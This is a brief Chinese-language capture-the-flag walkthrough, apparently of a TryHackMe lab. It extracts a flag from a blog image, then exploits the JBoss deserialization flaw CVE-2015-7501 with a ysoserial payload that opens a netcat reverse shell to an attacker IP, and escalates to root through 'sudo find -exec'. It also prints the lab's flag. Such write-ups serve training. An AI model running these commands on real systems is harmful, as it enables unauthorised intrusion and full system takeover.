访问 80 端口，是一个博客网站，只有两篇文章

在其中一个文章中发现作者在图片里面藏了信息

刚好下面就有一个图片，但是里面什么信息都没有

而在另一篇文章也有一个图片

下载后，使用 strings 命令得到 flag

┌──(root㉿kali)-[~/桌面]
└─# strings be2sOV9.jpg  | grep THM

'THM{Tony_Sure_Loves_Frosted_Flakes}(dQ

根据提示可知，该网站存在 cve-2015-7501 反序列化漏洞

下载利用工具https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar

攻击机监听端口，执行下面的命令尝试反弹 shell

┌──(root㉿kali)-[~/桌面]
└─# java -jar ysoserial-all.jar CommonsCollections5 "nc 192.168.140.133 4444 -e /bin/sh" | curl -X POST http://10.144.166.245:8080/invoker/JMXInvokerServlet --data-binary @- -o /dev/null

成功反弹，输入 id 有回显，但是其他命令则没有

find 有 -exec 参数，可以执行任意命令，用 find 启动 /bin/bash 直接提权到 root

jboss@thm-java-deserial:~$ sudo find / -exec /bin/bash \; -quit
root@thm-java-deserial:~# id
uid=0(root) gid=0(root) groups=0(root)
